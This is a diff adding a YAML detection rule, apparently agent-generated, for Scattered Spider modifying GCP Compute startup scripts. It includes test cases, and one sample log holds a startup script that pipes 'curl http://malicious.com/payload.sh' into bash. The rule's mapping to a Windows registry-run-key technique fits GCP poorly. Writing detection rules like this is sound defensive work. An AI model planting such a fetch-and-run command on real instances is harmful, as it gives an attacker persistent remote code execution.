@@ -1,0 +1,138 @@
+name: Scattered Spider - GCP Modify Compute Startup Script
+description: Detects attempts by threat actors like Scattered Spider to modify startup
+  scripts associated with GCP Compute Engine instances. This is a common persistence
+  mechanism to ensure malicious code executes automatically upon instance start or
+  reboot.
+type: query
+query: event.category:api AND cloud.provider:gcp AND event.action:compute.instances.setMetadata
+  AND event.outcome:success AND gcp.audit.metadata.request.key:startup-script
+language: lucene
+index:
+- gcp.auditlog-*
+filters: []
+risk_score: 73
+severity: high
+threat:
+- framework: MITRE ATT&CK
+  tactic:
+    id: TA0003
+    name: Persistence
+    reference: https://attack.mitre.org/tactics/TA0003/
+  technique:
+  - id: T1547.001
+    name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
+    reference: https://attack.mitre.org/techniques/T1547/001/
+references:
+- https://attack.mitre.org/techniques/T1547/001/
+- https://www.elastic.co/guide/en/ecs/current/ecs-cloud.html
+author:
+- Detection Agent
+false_positives:
+- Legitimate administrators or automation modifying startup scripts for instance configuration
+  or patching.
+note: '## Triage
+
+  Investigate: the user identity, source IP, and the content of the startup script
+  (if available in logs). Correlate with other changes to the instance.
+
+  Escalate if: script is modified by an unauthorized account, or contains suspicious
+  commands (e.g., downloaders, reverse shells).'
+test_cases:
+- type: TP
+  description: Successful modification of instance startup script
+  log_entry:
+    event:
+      category: api
+      type: change
+      action: compute.instances.setMetadata
+      outcome: success
+    cloud:
+      provider: gcp
+      service:
+        name: compute.googleapis.com
+    user:
+      name: attacker@example.com
+    gcp:
+      audit:
+        resource:
+          type: instance
+          name: web-app-vm
+        metadata:
+          request:
+            key: startup-script
+            value: '#!/bin/bash\ncurl http://malicious.com/payload.sh | bash'
+    '@timestamp': '2024-03-12T22:50:00Z'
+  expected_match: true
+  evasion_technique: null
+- type: FN
+  description: Startup script modified via gcloud CLI using metadata-from-file (content
+    not directly in key)
+  log_entry:
+    event:
+      category: api
+      type: change
+      action: compute.instances.setMetadata
+      outcome: success
+    cloud:
+      provider: gcp
+      service:
+        name: compute.googleapis.com
+    user:
+      name: attacker@example.com
+    gcp:
+      audit:
+        resource:
+          type: instance
+          name: web-app-vm
+        metadata:
+          request:
+            key: startup-script-url
+            value: gs://malicious-bucket/script.sh
+    '@timestamp': '2024-03-12T22:50:10Z'
+  expected_match: false
+  evasion_technique: This rule specifically looks for 'startup-script' key. If the
+    script is provided via a URL (startup-script-url), it won't match. Further analysis
+    of the URL content would be needed.
+- type: FP
+  description: Legitimate setting of other instance metadata
+  log_entry:
+    event:
+      category: api
+      type: change
+      action: compute.instances.setMetadata
+      outcome: success
+    cloud:
+      provider: gcp
+      service:
+        name: compute.googleapis.com
+    user:
+      name: admin@example.com
+    gcp:
+      audit:
+        resource:
+          type: instance
+          name: build-server
+        metadata:
+          request:
+            key: env-variable
+            value: PROD
+    '@timestamp': '2024-03-14T11:40:00Z'
+  expected_match: false
+  evasion_technique: null
+- type: TN
+  description: Normal GCP project metadata update
+  log_entry:
+    event:
+      category: api
+      type: change
+      action: compute.projects.setCommonInstanceMetadata
+      outcome: success
+    cloud:
+      provider: gcp
+      service:
+        name: compute.googleapis.com
+    user:
+      name: devops@example.com
+    '@timestamp': '2024-03-14T11:45:00Z'
+  expected_match: false
+  evasion_technique: null
